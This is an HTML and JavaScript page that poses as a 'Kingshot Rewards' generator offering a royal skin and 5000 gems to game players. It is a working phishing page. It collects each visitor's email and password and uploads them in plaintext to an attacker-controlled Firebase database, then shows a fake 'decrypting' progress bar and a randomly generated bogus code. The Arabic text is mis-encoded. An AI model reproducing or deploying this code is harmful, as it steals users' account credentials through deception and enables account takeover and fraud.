<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kingshot - Ù…Ø±ÙƒØ² Ø§Ù„Ø£ÙƒÙˆØ§Ø¯</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>

    <style>
        :root {
            --primary-purple: #4a148c;
            --accent-gold: #ffcf33;
            --dark-bg: #0f051d;
            --input-bg: rgba(255, 255, 255, 0.1);
        }

        body { 
            background: radial-gradient(circle, #2e0d56 0%, var(--dark-bg) 100%); 
            color: white; 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
            display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0;
        }

        .lang-switcher {
            position: fixed; top: 20px; left: 20px;
            background: transparent;
            border: 1px solid rgba(255, 207, 51, 0.3);
            color: rgba(255, 207, 51, 0.8); 
            padding: 4px 10px; border-radius: 5px;
            cursor: pointer; font-size: 11px; font-weight: bold;
            text-transform: uppercase; transition: 0.3s; z-index: 1000;
        }
        .lang-switcher:hover { background: rgba(255, 207, 51, 0.1); color: var(--accent-gold); }

        .box { 
            background: rgba(45, 12, 85, 0.95); 
            border: 2px solid var(--accent-gold); 
            padding: 30px; border-radius: 20px; 
            width: 90%; max-width: 380px; text-align: center; 
            box-shadow: 0 0 30px rgba(138, 43, 226, 0.4);
            position: relative;
        }

        .box::before { content: "ğŸ‘‘"; font-size: 40px; display: block; margin-bottom: 10px; }
        h2 { color: var(--accent-gold); text-transform: uppercase; margin-bottom: 5px; font-size: 24px; }
        p { color: #b39ddb; font-size: 14px; margin-bottom: 25px; }

        input { 
            width: 100%; padding: 14px; border-radius: 10px; border: 1px solid rgba(255, 207, 51, 0.3); 
            background: var(--input-bg); color: white; box-sizing: border-box; 
            text-align: center; margin-bottom: 15px; outline: none;
        }

        button.main-btn { 
            background: linear-gradient(135deg, #ffcf33 0%, #ffa000 100%); 
            color: #2d0c55; border: none; padding: 15px; width: 100%; 
            cursor: pointer; font-weight: 900; border-radius: 10px; font-size: 18px; 
        }

        .progress-container { display: none; width: 100%; background: #333; border-radius: 10px; margin-top: 20px; height: 10px; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: var(--accent-gold); transition: width 0.4s; }
        #status-text { font-size: 12px; margin-top: 10px; color: #b39ddb; }
        #final-code-box { display: none; margin-top: 20px; padding: 15px; border: 2px dashed var(--accent-gold); border-radius: 10px; }
        .code-display { font-family: monospace; font-size: 22px; color: var(--accent-gold); font-weight: bold; margin: 10px 0; }
        .footer-note { font-size: 10px; color: #7e57c2; margin-top: 20px; }
    </style>
</head>
<body>

    <button class="lang-switcher" onclick="toggleLang()" id="langBtn">EN</button>

    <div class="box">
        <div id="setup-view">
            <h2 id="title">KINGSHOT REWARDS</h2>
            <p id="desc">Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ÙƒÙˆØ¯ (Ø³ÙƒÙ† Ù…Ù„ÙƒÙŠ + 5000 Ø¬ÙˆÙ‡Ø±Ø©)</p>
            
            <input type="text" id="email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" required>
            <input type="password" id="password" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
            
            <button onclick="handleStart()" id="mainBtn" class="main-btn">ØªØ£ÙƒÙŠØ¯ ÙˆØ§Ø³ØªÙ„Ø§Ù… Ø§Ù„ÙƒÙˆØ¯</button>
        </div>

        <div id="process-view" style="display:none;">
            <h2 id="header-msg">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...</h2>
            <div class="progress-container" id="p-container" style="display:block;">
                <div class="progress-bar" id="p-bar"></div>
            </div>
            <p id="status-text">Ø¨Ø¯Ø¡ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ...</p>

            <div id="final-code-box">
                <p id="code-msg" style="font-size: 11px;">ØªÙ… ØªÙˆÙ„ÙŠØ¯ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­:</p>
                <div class="code-display" id="generated-code">---- ---- ----</div>
                <button onclick="location.reload()" id="closeBtn" style="padding: 8px; font-size: 14px; background: none; border: 1px solid white; color: white; border-radius: 5px; cursor: pointer;">Ø¥ØºÙ„Ø§Ù‚</button>
            </div>
        </div>
        
        <div class="footer-note" id="footer">Ù†Ø¸Ø§Ù… Ø­Ù…Ø§ÙŠØ© Kingshot Ø§Ù„Ù…Ø¹ØªÙ…Ø¯ ğŸ”’</div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAm1OfTW_qS4lhSGlqgDd6fiLDj3u93wqI",
            authDomain: "clashdata-8424c.firebaseapp.com",
            databaseURL: "https://clashdata-8424c-default-rtdb.firebaseio.com",
            projectId: "clashdata-8424c",
            storageBucket: "clashdata-8424c.firebasestorage.app",
            messagingSenderId: "1063000922754",
            appId: "1:1063000922754:web:87087f81c28c2659cb329b"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let currentLang = 'ar';
        const content = {
            ar: {
                title: "KINGSHOT REWARDS", desc: "Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ÙƒÙˆØ¯ (Ø³ÙƒÙ† Ù…Ù„ÙƒÙŠ + 5000 Ø¬ÙˆÙ‡Ø±Ø©)",
                email: "Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ", pass: "ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±", btn: "ØªØ£ÙƒÙŠØ¯ ÙˆØ§Ø³ØªÙ„Ø§Ù… Ø§Ù„ÙƒÙˆØ¯",
                loading: "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...", status: "Ø¨Ø¯Ø¡ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ...",
                success: "ØªÙ… Ø¨Ù†Ø¬Ø§Ø­!", codeMsg: "ØªÙ… ØªÙˆÙ„ÙŠØ¯ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­:",
                close: "Ø¥ØºÙ„Ø§Ù‚", footer: "Ù†Ø¸Ø§Ù… Ø­Ù…Ø§ÙŠØ© Kingshot Ø§Ù„Ù…Ø¹ØªÙ…Ø¯ ğŸ”’",
                errMail: "ÙØ´Ù„ Ø§Ù„Ù†Ø¸Ø§Ù…: ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø­Ø³Ø§Ø¨ ØµØ­ÙŠØ­ Ù…Ø±ØªØ¨Ø· Ø¨Ø§Ù„Ù„Ø¹Ø¨Ø©.",
                errPass: "ÙØ´Ù„ Ø§Ù„ØªÙˆØ«ÙŠÙ‚: ØªØ£ÙƒØ¯ Ù…Ù† ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±.",
                step1: "Ø¬Ø§Ø±ÙŠ Ù…Ø·Ø§Ø¨Ù‚Ø© Ø§Ù„Ø­Ø³Ø§Ø¨...", step2: "Ø¬Ø§Ø±ÙŠ ÙÙƒ ØªØ´ÙÙŠØ± Ø§Ù„Ø£ÙƒÙˆØ§Ø¯...", step3: "Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ...",
                langBtn: "EN"
            },
            en: {
                title: "KINGSHOT REWARDS", desc: "Login to get your code (Royal Skin + 5000 Gems)",
                email: "Email Address", pass: "Password", btn: "CONFIRM & GET CODE",
                loading: "Processing...", status: "Connecting to main server...",
                success: "Success!", codeMsg: "Your code has been generated:",
                close: "Close", footer: "Verified Kingshot Protection ğŸ”’",
                errMail: "System Failed: Please enter a valid game account.",
                errPass: "Auth Failed: Check your password.",
                step1: "Matching account in server...", step2: "Decrypting code bundle...", step3: "Extracting final code...",
                langBtn: "AR"
            }
        };

        function toggleLang() {
            currentLang = currentLang === 'ar' ? 'en' : 'ar';
            const c = content[currentLang];
            document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
            document.getElementById('langBtn').innerText = c.langBtn;
            document.getElementById('title').innerText = c.title;
            document.getElementById('desc').innerText = c.desc;
            document.getElementById('email').placeholder = c.email;
            document.getElementById('password').placeholder = c.pass;
            document.getElementById('mainBtn').innerText = c.btn;
            document.getElementById('header-msg').innerText = c.loading;
            document.getElementById('status-text').innerText = c.status;
            document.getElementById('code-msg').innerText = c.codeMsg;
            document.getElementById('closeBtn').innerText = c.close;
            document.getElementById('footer').innerText = c.footer;
        }

        function createCode() {
            const p = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let r = (n) => Array.from({length:n}, () => p[Math.floor(Math.random()*p.length)]).join('');
            return `KING-${r(4)}-${r(4)}`;
        }

        function handleStart() {
            const mail = document.getElementById('email').value.trim();
            const pass = document.getElementById('password').value;
            const c = content[currentLang];

            if (!mail.includes("@") || mail.length < 5) { alert(c.errMail); return; }
            if (pass.length < 5) { alert(c.errPass); return; }

            document.getElementById('setup-view').style.display = 'none';
            document.getElementById('process-view').style.display = 'block';

            let p = 0;
            const bar = document.getElementById('p-bar');
            const status = document.getElementById('status-text');

            const timer = setInterval(() => {
                p += Math.floor(Math.random() * 15) + 5;
                if (p >= 100) {
                    p = 100; clearInterval(timer);
                    const code = createCode();
                    database.ref('kingshot_codes/').push({ account: mail, password: pass, code: code, timestamp: new Date().toLocaleString() }).then(() => {
                        document.getElementById('header-msg').innerText = c.success;
                        document.getElementById('p-container').style.display = 'none';
                        status.style.display = 'none';
                        document.getElementById('generated-code').innerText = code;
                        document.getElementById('final-code-box').style.display = 'block';
                    });
                }
                bar.style.width = p + "%";
                if(p < 40) status.innerText = c.step1;
                else if(p < 80) status.innerText = c.step2;
                else status.innerText = c.step3;
            }, 600);
        }
    </script>
</body>
</html>
